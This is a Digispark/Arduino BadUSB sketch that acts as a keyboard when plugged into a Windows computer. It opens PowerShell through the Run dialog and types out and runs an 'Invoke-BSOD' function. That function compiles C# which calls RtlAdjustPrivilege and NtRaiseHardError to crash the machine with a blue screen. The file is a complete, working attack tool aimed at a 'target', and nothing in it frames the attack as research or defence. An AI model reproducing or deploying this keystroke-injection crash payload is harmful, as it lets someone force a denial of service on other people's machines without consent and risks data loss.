// Change the keyboard layout to that of your target
#define keyboardlayout_fr

// Import CustomDigiKeyboard library
#include "CustomDigiKeyboard.h"

void setup() {
  // Initialize the digital pin as an output
  pinMode(1, OUTPUT);
  // Reset KeyStroke
  DigiKeyboard.sendKeyStroke(0);
}

void loop() {
  // Turn the LED on while program is running
  digitalWrite(1, HIGH);

  // Open powershell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Inoke BSOD
  // Source https://github.com/peewpw/Invoke-BSOD
  DigiKeyboard.print(F("function Invoke-BSOD {\n"
    "$source = @\"\n"
    "using System;\n"
    "using System.Runtime.InteropServices;\n"
    "public static class CS{\n"
    "  [DllImport(\"ntdll.dll\")]\n"
    "  public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);\n"
    "  [DllImport(\"ntdll.dll\")]\n"
    "  public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);\n"
    "  public static unsafe void Kill(){\n"
    "    Boolean tmp1;\n"
    "    uint tmp2;\n"
    "    RtlAdjustPrivilege(19, true, false, out tmp1);\n"
    "    NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);\n"
    "  }\n"
    "}\n"
    "\"@\n"
    "    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters\n"
    "    $comparams.CompilerOptions = '/unsafe'\n"
    "    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams\n"
    "    [CS]::Kill()\n"
    "}\n"));
  DigiKeyboard.print("Invoke-BSOD\n");

  // Turn the LED off
  digitalWrite(1, LOW);
  // End of program
  while(1);
}
